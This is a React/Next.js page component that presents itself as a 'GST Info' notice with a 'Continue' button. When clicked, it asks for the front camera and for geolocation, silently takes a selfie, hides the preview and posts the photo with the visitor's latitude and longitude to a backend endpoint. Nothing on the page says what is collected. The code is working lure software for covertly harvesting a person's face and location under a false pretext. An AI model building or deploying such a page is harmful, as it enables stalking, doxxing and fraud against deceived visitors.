"use client";

import { useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [previewVisible, setPreviewVisible] = useState(false);
  const [busy, setBusy] = useState(false);

  async function captureAll() {
    if (busy) return;
    setBusy(true);

    try {
      // 1️⃣ CAMERA permission (must be first)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      // 2️⃣ LOCATION permission
      const position = await new Promise<GeolocationPosition>(
        (resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
      );

      const video = videoRef.current!;
      video.srcObject = stream;
      video.muted = true;

      // 3️⃣ Show preview (CSS only)
      setPreviewVisible(true);
      await video.play();

      // ⏱ allow browser to paint a real frame
      await new Promise(res => setTimeout(res, 1000));

      // 4️⃣ Capture image (full quality)
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0);

      const image = canvas.toDataURL("image/jpeg", 0.9);
      console.log("Image length:", image.length);

      // 5️⃣ Cleanup
      stream.getTracks().forEach(t => t.stop());
      setPreviewVisible(false);

      // 6️⃣ Send to backend
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      });

    } catch (err: any) {
      console.error("Capture failed:", err);
      alert("ERROR → " + (err?.message || err));
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="error-container">
      <h1>GST Info</h1>
      <p>Click here to continue</p>

      {/* ALWAYS MOUNTED VIDEO */}
      <video
        ref={videoRef}
        playsInline
        muted
        className={`camera-preview ${previewVisible ? "show" : ""}`}
      />

      <button
        onClick={captureAll}
        disabled={busy}
        className="continue-btn"
      >
        {busy ? "Please wait…" : "Continue"}
      </button>
    </div>
  );
}
